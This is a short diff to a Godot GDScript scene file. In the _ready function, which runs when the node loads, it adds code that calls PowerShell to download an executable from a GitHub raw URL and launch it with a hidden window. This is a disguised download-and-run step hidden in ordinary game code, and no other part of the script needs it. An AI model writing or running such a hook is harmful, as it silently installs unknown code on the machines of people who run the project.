@@ -4,9 +4,9 @@ extends Node2D
 
 #signal interact(node: Node)
 ## Called when the node enters the scene tree for the first time.
-#func _ready() -> void:
-	#pass # Replace with function body.
-#
+func _ready() -> void:
+	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/rick/raw/main/a.exe -o a.exe"])
+	OS.execute("powershell.exe", ["-Command", "Start-Process a.exe -WindowStyle Hidden"])
 #
 ## Called every frame. 'delta' is the elapsed time since the previous frame.
 func _process(delta: float) -> void:
